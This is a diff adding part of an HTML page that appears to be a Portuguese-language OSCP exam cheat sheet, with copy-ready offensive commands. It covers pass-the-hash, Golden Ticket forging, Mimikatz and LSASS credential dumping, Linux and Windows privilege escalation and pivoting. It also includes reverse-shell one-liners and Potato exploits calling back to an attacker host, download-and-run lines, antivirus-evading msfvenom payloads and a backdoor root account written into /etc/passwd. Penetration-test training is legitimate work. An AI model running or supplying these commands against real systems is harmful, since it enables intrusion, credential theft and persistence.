+<span class="gc">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$IP</span> <span class="cc">-u</span> <span class="oc">Administrator</span> <span class="cc">-H</span> <span class="yc">NTLM_HASH</span>
+<span class="gc">wmiexec.py</span> <span class="cc">-hashes</span> <span class="oc">:NTLM</span> <span class="oc">domain/Administrator@</span><span class="wc">$IP</span>
+<span class="gc">psexec.py</span> <span class="cc">-hashes</span> <span class="oc">:NTLM</span> <span class="oc">domain/Administrator@</span><span class="wc">$IP</span>
+
+<span class="dc"># Pass-the-Ticket</span>
+<span class="gc">getTGT.py</span> <span class="oc">domain.local/user</span> <span class="cc">-hashes</span> <span class="oc">:ntlm</span>
+<span class="pc">export</span> KRB5CCNAME=<span class="oc">user.ccache</span>
+<span class="gc">psexec.py</span> <span class="cc">-k</span> <span class="cc">-no-pass</span> <span class="oc">domain.local/user@</span><span class="wc">$TARGET</span>
+
+<span class="dc"># Overpass-the-Hash → TGT</span>
+<span class="pc">sekurlsa::pth</span> <span class="cc">/user:</span><span class="oc">admin</span> <span class="cc">/domain:</span><span class="oc">domain.local</span> <span class="cc">/ntlm:</span><span class="yc">HASH</span> <span class="cc">/run:cmd</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">👑</span><span class="title">DCSync / Golden Ticket / Silver Ticket</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># DCSync — dump NTDS.dit via replicação</span>
+<span class="gc">secretsdump.py</span> <span class="oc">domain/DA:pass@</span><span class="wc">$DC</span>
+<span class="gc">secretsdump.py</span> <span class="cc">-just-dc-ntlm</span> <span class="oc">domain/user:pass@</span><span class="wc">$DC</span>
+<span class="pc">lsadump::dcsync</span> <span class="cc">/domain:</span><span class="oc">domain.local</span> <span class="cc">/user:</span><span class="oc">krbtgt</span>
+
+<span class="dc"># Golden Ticket</span>
+<span class="gc">ticketer.py</span> <span class="cc">-nthash</span> <span class="yc">KRBTGT_HASH</span> <span class="cc">-domain-sid</span> <span class="oc">S-1-5-21-...</span> <span class="cc">-domain</span> <span class="oc">domain.local</span> <span class="yc">Administrator</span>
+<span class="pc">export</span> KRB5CCNAME=<span class="oc">Administrator.ccache</span>
+
+<span class="dc"># Silver Ticket (serviço específico)</span>
+<span class="gc">ticketer.py</span> <span class="cc">-nthash</span> <span class="yc">SERVICE_HASH</span> <span class="cc">-domain-sid</span> <span class="oc">S-1-5-21-...</span> <span class="cc">-domain</span> <span class="oc">domain.local</span> <span class="cc">-spn</span> <span class="yc">cifs/server</span> <span class="yc">Administrator</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card cgreen">
+    <div class="ch"><span class="ico">🪄</span><span class="title">Mimikatz — Dump Completo de Credenciais</span></div>
+    <div class="cb0">
+      <div class="g2">
+        <div class="cb"><pre><span class="dc"># Escalada e dump principal</span>
+<span class="pc">privilege::debug</span>
+<span class="pc">token::elevate</span>
+<span class="pc">sekurlsa::logonpasswords</span>    <span class="dc">NTLM + plaintext (wdigest)</span>
+<span class="pc">sekurlsa::wdigest</span>
+<span class="pc">lsadump::sam</span>                <span class="dc">SAM hashes locais</span>
+<span class="pc">lsadump::cache</span>              <span class="dc">Cached domain creds</span>
+<span class="pc">lsadump::secrets</span>            <span class="dc">LSA secrets</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        <div class="cb"><pre><span class="dc"># Kerberos tickets</span>
+<span class="pc">sekurlsa::tickets /export</span>   <span class="dc">Exportar .kirbi</span>
+<span class="pc">kerberos::list /export</span>
+<span class="pc">kerberos::ptt ticket.kirbi</span>  <span class="dc">Pass-the-Ticket</span>
+
+<span class="dc"># Golden Ticket via Mimikatz</span>
+<span class="pc">kerberos::golden</span> <span class="cc">/user:</span><span class="oc">admin</span> <span class="cc">/domain:</span><span class="oc">domain.local</span> <span class="cc">/sid:</span><span class="yc">S-1-5-21-...</span> <span class="cc">/krbtgt:</span><span class="yc">HASH</span> <span class="cc">/ticket:golden.kirbi</span>
+<span class="pc">misc::cmd</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 6. PRIVESC LINUX ══════ -->
+<section class="sec" id="privesc-linux">
+  <div class="sec-head">
+    <span class="sec-num">06</span>
+    <span class="sec-title">Privilege Escalation — Linux</span>
+    <span class="sec-badge">10 PTS</span>
+  </div>
+
+  <div class="g2">
+    <div class="card cgreen">
+      <div class="ch"><span class="ico">⚡</span><span class="title">LinPEAS — Automated Enum</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Download e executa</span>
+<span class="gc">curl</span> <span class="cc">-L</span> <span class="oc">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span> | <span class="gc">sh</span>
+<span class="gc">wget</span> <span class="oc">http://</span><span class="wc">$LHOST</span><span class="oc">/linpeas.sh</span> <span class="cc">-O</span> <span class="yc">/tmp/lp.sh</span> && <span class="gc">bash</span> <span class="yc">/tmp/lp.sh</span> | <span class="gc">tee</span> <span class="yc">/tmp/lp.out</span>
+
+<span class="dc"># Ver com cores</span>
+<span class="gc">less</span> <span class="cc">-R</span> <span class="yc">/tmp/lp.out</span>
+
+<span class="dc"># linux-exploit-suggester</span>
+<span class="gc">./les.sh</span>
+<span class="gc">./linux-exploit-suggester-2.pl</span>
+
+<span class="dc"># Enum manual rápido</span>
+<span class="gc">id</span> && <span class="gc">uname</span> <span class="cc">-a</span> && <span class="gc">cat</span> <span class="yc">/etc/os-release</span>
+<span class="gc">sudo</span> <span class="cc">-l</span> && <span class="gc">crontab</span> <span class="cc">-l</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🔐</span><span class="title">SUDO / SUID / Capabilities</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># SUDO check → GTFObins</span>
+<span class="gc">sudo</span> <span class="cc">-l</span>
+<span class="dc"># Exemplos GTFObins:</span>
+<span class="gc">sudo find</span> <span class="yc">.</span> <span class="cc">-exec</span> <span class="yc">/bin/sh \; -quit</span>
+<span class="gc">sudo vim</span> <span class="cc">-c</span> <span class="oc">':!/bin/bash'</span>
+<span class="gc">sudo python3</span> <span class="cc">-c</span> <span class="oc">'import os; os.system("/bin/bash")'</span>
+<span class="gc">sudo less</span> <span class="yc">/etc/hosts</span>  <span class="dc">→ !bash</span>
+
+<span class="dc"># SUID</span>
+<span class="gc">find</span> <span class="yc">/</span> <span class="cc">-perm</span> <span class="cc">-u=s</span> <span class="cc">-type f</span> <span class="yc">2</span>&gt;<span class="yc">/dev/null</span>
+
+<span class="dc"># Capabilities</span>
+<span class="gc">getcap</span> <span class="cc">-r</span> <span class="yc">/</span> <span class="yc">2</span>&gt;<span class="yc">/dev/null</span>
+<span class="dc"># cap_setuid+ep → python3 -c "import os;os.setuid(0);os.system('/bin/bash')"</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">📅</span><span class="title">Cron Jobs / Path Hijacking / Writable Files</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Cron jobs</span>
+<span class="gc">cat</span> <span class="yc">/etc/crontab</span>
+<span class="gc">ls</span> <span class="cc">-la</span> <span class="yc">/etc/cron*</span>
+<span class="gc">crontab</span> <span class="cc">-l</span>
+<span class="gc">cat</span> <span class="yc">/var/spool/cron/crontabs/root</span>
+
+<span class="dc"># Path hijacking (script usa PATH relativo)</span>
+<span class="pc">export</span> PATH=<span class="oc">/tmp:</span><span class="wc">$PATH</span>
+<span class="gc">echo</span> <span class="oc">'/bin/bash -p'</span> &gt; <span class="yc">/tmp/cmd_name</span>
+<span class="gc">chmod</span> <span class="yc">+x</span> <span class="yc">/tmp/cmd_name</span>
+
+<span class="dc"># Writable /etc/passwd</span>
+<span class="gc">echo</span> <span class="oc">'hacker:$(openssl passwd pass):0:0:root:/root:/bin/bash'</span> &gt;&gt; <span class="yc">/etc/passwd</span>
+
+<span class="dc"># Writable scripts</span>
+<span class="gc">find</span> <span class="yc">/</span> <span class="cc">-writable</span> <span class="cc">-type f</span> <span class="yc">2</span>&gt;<span class="yc">/dev/null</span> | <span class="gc">grep</span> <span class="cc">-v</span> <span class="oc">proc</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cred">
+      <div class="ch"><span class="ico">🗝️</span><span class="title">Senhas em Arquivos + Kernel Exploits</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Busca de senhas</span>
+<span class="gc">grep</span> <span class="cc">-rni</span> <span class="oc">"password\|passwd\|secret\|key"</span> <span class="yc">/var/www/ /home/ /opt/</span> <span class="yc">2</span>&gt;<span class="yc">/dev/null</span>
+<span class="gc">cat</span> <span class="yc">~/.bash_history ~/.ssh/id_rsa /etc/mysql/debian.cnf</span>
+<span class="gc">cat</span> <span class="yc">/var/www/html/config.php</span>  <span class="dc">→ wp-config.php → .env</span>
+
+<span class="dc"># Kernel exploits</span>
+<span class="gc">uname</span> <span class="cc">-a</span>  <span class="dc">→ procurar no ExploitDB</span>
+<span class="dc"># DirtyCow   CVE-2016-5195  (2.6.22 - 3.9)</span>
+<span class="dc"># DirtyPipe  CVE-2022-0847  (5.8 - 5.16)</span>
+<span class="dc"># OverlayFS  CVE-2023-0386  (5.4 - 6.0)</span>
+<span class="dc"># PwnKit     CVE-2021-4034  (pkexec todos)</span>
+<span class="dc"># Baron Sam  CVE-2021-3156  (sudo < 1.9.5)</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 7. PRIVESC WINDOWS ══════ -->
+<section class="sec" id="privesc-win">
+  <div class="sec-head">
+    <span class="sec-num">07</span>
+    <span class="sec-title">Privilege Escalation — Windows</span>
+    <span class="sec-badge">10 PTS</span>
+  </div>
+
+  <div class="g2">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">⚡</span><span class="title">WinPEAS — Automated Enum</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Executar WinPEAS</span>
+<span class="gc">.\winPEASany.exe</span>
+<span class="gc">.\winPEASx64.exe</span> <span class="yc">quiet servicesinfo userinfo</span>
+
+<span class="dc"># PowerShell IEX</span>
+<span class="pc">iex</span>(<span class="pc">New-Object</span> Net.WebClient).DownloadString(<span class="oc">"http://</span><span class="wc">$LHOST</span><span class="oc">/winPEAS.ps1"</span>)
+
+<span class="dc"># Enum manual</span>
+<span class="gc">whoami /all</span>                <span class="dc">privs + grupos</span>
+<span class="gc">net user</span>                   <span class="dc">usuários locais</span>
+<span class="gc">net localgroup administrators</span>
+<span class="gc">systeminfo</span>                 <span class="dc">OS + patches</span>
+<span class="gc">wmic qfe list brief</span>        <span class="dc">hotfixes instalados</span>
+<span class="gc">tasklist /v</span>                <span class="dc">processos rodando</span>
+<span class="gc">netstat -ano</span>               <span class="dc">conexões/portas</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🏆</span><span class="title">Token Impersonation — Potato Family</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Verificar SeImpersonatePrivilege</span>
+<span class="gc">whoami /priv</span>  <span class="dc">→ procurar SeImpersonatePrivilege: Enabled</span>
+
+<span class="dc"># GodPotato (recomendado 2024+)</span>
+<span class="gc">.\GodPotato.exe</span> <span class="cc">-cmd</span> <span class="oc">"cmd /c whoami"</span>
+<span class="gc">.\GodPotato.exe</span> <span class="cc">-cmd</span> <span class="oc">"cmd /c nc.exe $LHOST 4444 -e cmd"</span>
+
+<span class="dc"># PrintSpoofer (Win 10/Server 2019+)</span>
+<span class="gc">.\PrintSpoofer64.exe</span> <span class="cc">-i</span> <span class="cc">-c</span> <span class="oc">cmd</span>
+
+<span class="dc"># JuicyPotatoNG</span>
+<span class="gc">.\JuicyPotatoNG.exe</span> <span class="cc">-t</span> <span class="oc">*</span> <span class="cc">-p</span> <span class="oc">cmd.exe</span> <span class="cc">-a</span> <span class="oc">"/c nc -e cmd $LHOST 4444"</span>
+
+<span class="dc"># SweetPotato</span>
+<span class="gc">.\SweetPotato.exe</span> <span class="cc">-a</span> <span class="oc">"nc $LHOST 4444 -e cmd"</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">🔧</span><span class="title">Services / Unquoted Path / Registry</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Unquoted service path</span>
+<span class="gc">wmic service get name,displayname,pathname,startmode</span> | <span class="gc">findstr /i</span> <span class="oc">"auto"</span> | <span class="gc">findstr /i /v</span> <span class="oc">""""</span>
+
+<span class="dc"># Weak service permissions</span>
+<span class="gc">accesschk.exe</span> <span class="cc">-uwcqv</span> <span class="oc">"Authenticated Users"</span> <span class="yc">*</span>
+<span class="gc">sc qc</span> <span class="yc">VulnSvc</span>
+<span class="gc">sc config</span> <span class="yc">VulnSvc</span> <span class="cc">binpath=</span> <span class="oc">"cmd /c nc $LHOST 4444 -e cmd"</span>
+
+<span class="dc"># Registry — AutoRun / Stored creds</span>
+<span class="gc">reg query HKLM</span> <span class="cc">/f</span> <span class="oc">password</span> <span class="cc">/t</span> <span class="yc">REG_SZ</span> <span class="cc">/s</span>
+<span class="gc">reg query</span> <span class="oc">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span>
+<span class="gc">reg query HKCU\Software\SimonTatham\PuTTY\Sessions</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cred">
+      <div class="ch"><span class="ico">🔑</span><span class="title">SAM Dump / Credenciais Windows</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># SAM + SYSTEM dump</span>
+<span class="gc">reg save HKLM\SAM</span> <span class="oc">C:\tmp\sam.save</span>
+<span class="gc">reg save HKLM\SYSTEM</span> <span class="oc">C:\tmp\sys.save</span>
+<span class="gc">secretsdump.py</span> <span class="cc">-sam</span> <span class="yc">sam.save</span> <span class="cc">-system</span> <span class="yc">sys.save</span> <span class="yc">LOCAL</span>
+
+<span class="dc"># Arquivos com senhas</span>
+<span class="gc">findstr /si password</span> <span class="oc">*.txt *.ini *.xml *.config *.ps1 *.bat</span>
+<span class="gc">dir /s /b</span> <span class="oc">*pass* *cred* *secret* *unattend*</span>
+
+<span class="dc"># Credenciais em memória (LSASS)</span>
+<span class="gc">tasklist</span> | <span class="gc">findstr</span> <span class="oc">lsass</span>
+<span class="dc"># Dump com Procdump:</span>
+<span class="gc">.\procdump64.exe</span> <span class="cc">-ma</span> <span class="yc">LSASS_PID</span> <span class="oc">lsass.dmp</span>
+<span class="dc"># Depois: secretsdump.py -security lsass.dmp LOCAL</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 8. PIVOTING ══════ -->
+<section class="sec" id="pivoting">
+  <div class="sec-head">
+    <span class="sec-num">08</span>
+    <span class="sec-title">Pivoting & Port Forwarding</span>
+    <span class="sec-badge">LATERAL MOVEMENT</span>
+  </div>
+
+  <div class="alert alert-r" style="margin-bottom:16px">
+    <div class="alert-label">REGRA CRÍTICA OSCP+</div>
+    Metasploit NÃO pode ser usado para pivoting. Use SSH tunneling, Chisel, Ligolo-ng ou socat.
+  </div>
+
+  <div class="g3">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">🚇</span><span class="title">SSH Tunneling</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Local forward</span>
+<span class="gc">ssh</span> <span class="cc">-L</span> <span class="yc">8080:INTERNAL:80</span> <span class="oc">user@</span><span class="wc">$PIVOT</span>
+
+<span class="dc"># Remote forward</span>
+<span class="gc">ssh</span> <span class="cc">-R</span> <span class="yc">9999:127.0.0.1:4444</span> <span class="oc">user@</span><span class="wc">$PIVOT</span>
+
+<span class="dc"># SOCKS5 (dynamic)</span>
+<span class="gc">ssh</span> <span class="cc">-D</span> <span class="yc">1080</span> <span class="cc">-fN</span> <span class="oc">user@</span><span class="wc">$PIVOT</span>
+<span class="dc"># proxychains.conf:</span>
+<span class="oc">socks5 127.0.0.1 1080</span>
+<span class="gc">proxychains</span> <span class="yc">nmap -sT -Pn</span> <span class="wc">$INTERNAL</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cgreen">
+      <div class="ch"><span class="ico">🔀</span><span class="title">Chisel (TCP Tunnel)</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># ATTACKER (server)</span>
+<span class="gc">./chisel</span> <span class="yy">server</span> <span class="cc">-p</span> <span class="yc">8000</span> <span class="cc">--reverse</span>
+
+<span class="dc"># PIVOT (client reverse)</span>
+<span class="gc">.\chisel.exe</span> <span class="yy">client</span> <span class="wc">$LHOST</span><span class="oc">:8000</span> <span class="yc">R:socks</span>
+<span class="dc"># Socks5 em 127.0.0.1:1080</span>
+
+<span class="dc"># Forward específico</span>
+<span class="gc">.\chisel.exe</span> <span class="yy">client</span> <span class="wc">$LHOST</span><span class="oc">:8000</span> <span class="yc">R:3306:INTERNAL:3306</span>
+
+<span class="dc"># proxychains → use socks5 127.0.0.1 1080</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">⚡</span><span class="title">Ligolo-ng (Melhor)</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Setup tun interface</span>
+<span class="gc">sudo ip tuntap add user</span> <span class="yc">kali</span> <span class="cc">mode tun</span> <span class="yc">ligolo</span>
+<span class="gc">sudo ip link set</span> <span class="yc">ligolo</span> <span class="cc">up</span>
+
+<span class="dc"># ATTACKER proxy</span>
+<span class="gc">./proxy</span> <span class="cc">-selfcert</span> <span class="cc">-laddr</span> <span class="oc">0.0.0.0:11601</span>
+
+<span class="dc"># PIVOT agent</span>
+<span class="gc">./agent</span> <span class="cc">-connect</span> <span class="wc">$LHOST</span><span class="oc">:11601</span> <span class="cc">-ignore-cert</span>
+
+<span class="dc"># No proxy console</span>
+<span class="pc">session</span> → <span class="pc">start</span>
+<span class="gc">sudo ip route add</span> <span class="oc">10.10.10.0/24</span> <span class="cc">dev ligolo</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🔄</span><span class="title">socat / netcat Redirects</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># socat TCP redirect</span>
+<span class="gc">socat</span> <span class="yc">TCP-LISTEN:8080,fork</span> <span class="yy">TCP:</span><span class="wc">$INTERNAL</span><span class="oc">:80</span>
+
+<span class="dc"># socat TTY shell</span>
+<span class="gc">socat</span> <span class="yc">file:`tty`,raw,echo=0</span> <span class="yy">tcp-listen:</span><span class="yc">4444</span>
+
+<span class="dc"># netsh (Windows port forward)</span>
+<span class="gc">netsh interface portproxy add v4tov4</span> <span class="cc">listenport=</span><span class="yc">4444</span> <span class="cc">listenaddress=</span><span class="yc">0.0.0.0</span> <span class="cc">connectport=</span><span class="yc">80</span> <span class="cc">connectaddress=</span><span class="wc">$INTERNAL</span>
+<span class="gc">netsh interface portproxy show all</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cred">
+      <div class="ch"><span class="ico">⚠️</span><span class="title">proxychains config</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># /etc/proxychains4.conf</span>
+<span class="oc">strict_chain</span>     <span class="dc">→ falha se proxy cair</span>
+<span class="oc">dynamic_chain</span>    <span class="dc">→ pula proxies com falha</span>
+
+<span class="oc">socks5  127.0.0.1  1080</span>   <span class="dc">← Chisel/SSH/Ligolo</span>
+<span class="oc">socks4  127.0.0.1  9050</span>   <span class="dc">← Tor (não use no exam!)</span>
+
+<span class="dc"># Uso</span>
+<span class="gc">proxychains</span> <span class="yy">nmap</span> <span class="cc">-sT -Pn -p</span> <span class="yc">22,80,445</span> <span class="wc">$INTERNAL</span>
+<span class="gc">proxychains</span> <span class="yy">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$INTERNAL</span>
+<span class="gc">proxychains</span> <span class="yy">ssh</span> <span class="oc">user@</span><span class="wc">$INTERNAL</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 9. SHELLS ══════ -->
+<section class="sec" id="shells">
+  <div class="sec-head">
+    <span class="sec-num">09</span>
+    <span class="sec-title">Shells, Payloads & Listeners</span>
+    <span class="sec-badge">REVERSE / BIND</span>
+  </div>
+
+  <div class="card cred">
+    <div class="ch"><span class="ico">🛠</span><span class="title">msfvenom — Geração de Payloads</span></div>
+    <div class="cb0">
+      <div class="g2">
+        <div class="cb"><pre><span class="dc"># Linux reverse shell ELF</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">linux/x64/shell_reverse_tcp</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-f</span> <span class="yc">elf</span> <span class="cc">-o</span> <span class="oc">shell.elf</span>
+<span class="dc"># Windows EXE</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">windows/x64/shell_reverse_tcp</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-f</span> <span class="yc">exe</span> <span class="cc">-o</span> <span class="oc">shell.exe</span>
+<span class="dc"># PHP webshell</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">php/reverse_php</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-f</span> <span class="yc">raw</span> <span class="cc">-o</span> <span class="oc">shell.php</span>
+<span class="dc"># ASP / ASPX</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">windows/shell_reverse_tcp</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-f</span> <span class="yc">aspx</span> <span class="cc">-o</span> <span class="oc">shell.aspx</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        <div class="cb"><pre><span class="dc"># Encoded (bypass AV básico)</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">windows/x64/shell_reverse_tcp</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-e</span> <span class="yc">x64/xor_dynamic</span> <span class="cc">-i</span> <span class="yc">5</span> <span class="cc">-f</span> <span class="yc">exe</span> <span class="cc">-o</span> <span class="oc">enc.exe</span>
+
+<span class="dc"># Staged vs Stageless</span>
+<span class="dc"># shell_reverse_tcp     → stageless (tudo inline)</span>
+<span class="dc"># shell/reverse_tcp     → staged (precisa MSF handler)</span>
+<span class="dc"># Prefira stageless para OSCP!</span>
+
+<span class="dc"># Python BOF shellcode</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">windows/shell_reverse_tcp</span> LHOST=<span class="wc">$IP</span> LPORT=<span class="yc">4444</span> <span class="cc">-b</span> <span class="oc">"\x00\xbad"</span> <span class="cc">-f</span> <span class="yc">python</span> <span class="cc">-v</span> <span class="yc">shellcode</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">🐱‍💻</span><span class="title">One-liners Reverse Shell</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Bash</span>
+<span class="gc">bash</span> <span class="cc">-i</span> &gt;&amp; <span class="yc">/dev/tcp/</span><span class="wc">$LHOST</span><span class="yc">/4444</span> <span class="yc">0</span>&gt;&amp;<span class="yc">1</span>
+<span class="dc"># ou</span>
+<span class="gc">bash</span> <span class="cc">-c</span> <span class="oc">"bash -i &gt;&amp; /dev/tcp/$LHOST/4444 0&gt;&amp;1"</span>
+
+<span class="dc"># Python3</span>
+<span class="gc">python3</span> <span class="cc">-c</span> <span class="oc">'import socket,os,pty;s=socket.socket();s.connect(("$LHOST",4444));[os.dup2(s.fileno(),x) for x in(0,1,2)];pty.spawn("/bin/bash")'</span>
+
+<span class="dc"># Netcat com -e</span>
+<span class="gc">nc</span> <span class="wc">$LHOST</span> <span class="yc">4444</span> <span class="cc">-e</span> <span class="yc">/bin/bash</span>
+
+<span class="dc"># Netcat sem -e (mkfifo)</span>
+<span class="gc">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&amp;1 | nc</span> <span class="wc">$LHOST</span> <span class="yc">4444</span> &gt; <span class="yc">/tmp/f</span>
+
+<span class="dc"># PowerShell</span>
+<span class="gc">powershell</span> <span class="cc">-nop -w hidden -enc</span> <span class="oc">BASE64_PAYLOAD</span>
+<span class="dc"># Gerar base64: IEX(New-Object Net.WebClient).DownloadString(url)</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cgreen">
+      <div class="ch"><span class="ico">🖥️</span><span class="title">Shell Upgrade — TTY Completo</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Listener com rlwrap</span>
+<span class="gc">rlwrap nc</span> <span class="cc">-lvnp</span> <span class="yc">4444</span>
+
+<span class="dc"># Python PTY → TTY completo</span>
+<span class="gc">python3</span> <span class="cc">-c</span> <span class="oc">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="dc"># Ctrl+Z</span>
+<span class="gc">stty raw</span> <span class="cc">-echo</span>; <span class="gc">fg</span>
+<span class="gc">reset</span>
+<span class="pc">export</span> TERM=xterm SHELL=bash
+<span class="gc">stty rows</span> <span class="yc">50</span> <span class="yc">columns</span> <span class="yc">220</span>
+
+<span class="dc"># socat (melhor TTY)</span>
+<span class="dc"># Listener:</span>
+<span class="gc">socat</span> <span class="yc">file:`tty`,raw,echo=0 tcp-listen:4444</span>
+<span class="dc"># Target:</span>
+<span class="gc">socat</span> <span class="yc">exec:'bash -li',pty,stderr,setsid,sigint,sane</span> <span class="oc">tcp:</span><span class="wc">$LHOST</span><span class="oc">:4444</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 10. PASSWORDS ══════ -->
+<section class="sec" id="passwords">
+  <div class="sec-head"><span class="sec-num">10</span><span class="sec-title">Password Attacks &amp; Hash Cracking</span><span class="sec-badge">CRACK</span></div>
+  <div class="g2">
+    <div class="card cy">
+      <div class="ch"><span>&#128296;</span><span class="t">Hashcat — Modos Essenciais</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Identificar hash</span>
+<span class="kc">hashid</span> <span class="oc">'$HASH'</span>  |  <span class="kc">hash-identifier</span>
+
+<span class="dc"># Modos mais usados no OSCP</span>
+<span class="dc"># -m 0     MD5          -m 100    SHA1</span>
+<span class="dc"># -m 1000  NTLM         -m 5600   NTLMv2</span>
+<span class="dc"># -m 13100 Kerberoast   -m 18200  AS-REP Roast</span>
+<span class="dc"># -m 1800  sha512crypt  -m 500    md5crypt</span>
+
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">1000</span> <span class="oc">hash.txt</span> <span class="oc">rockyou.txt</span>
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">1000</span> <span class="oc">hash.txt</span> <span class="oc">rockyou.txt</span> <span class="fc">-r</span> <span class="oc">/usr/share/hashcat/rules/best64.rule</span>
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">13100</span> <span class="oc">tgs.txt</span> <span class="oc">rockyou.txt</span> <span class="fc">--force</span>
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">18200</span> <span class="oc">asrep.txt</span> <span class="oc">rockyou.txt</span> <span class="fc">--force</span>
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">5600</span> <span class="oc">ntlmv2.txt</span> <span class="oc">rockyou.txt</span>
+<span class="kc">hashcat</span> <span class="fc">-m</span> <span class="ac">1000</span> <span class="oc">hash.txt</span> <span class="fc">-a</span> <span class="ac">3</span> <span class="oc">?a?a?a?a?a?a</span>  <span class="dc">(brute 6 chars)</span></pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+      </div>
+    </div>
+    <div class="card cg">
+      <div class="ch"><span>&#128163;</span><span class="t">John + Hydra + CrackMapExec</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># John the Ripper</span>
+<span class="kc">john</span> <span class="oc">hash.txt</span> <span class="fc">--wordlist=</span><span class="oc">rockyou.txt</span>
+<span class="kc">unshadow</span> <span class="ac">/etc/passwd /etc/shadow</span> &gt; <span class="oc">unshadowed.txt</span>
+<span class="kc">john</span> <span class="oc">unshadowed.txt</span> <span class="fc">--wordlist=</span><span class="oc">rockyou.txt</span>
+<span class="kc">zip2john</span> <span class="ac">file.zip</span> &gt; <span class="oc">zip.hash</span> &amp;&amp; <span class="kc">john</span> <span class="oc">zip.hash</span> <span class="fc">--wordlist=</span><span class="oc">rockyou.txt</span>
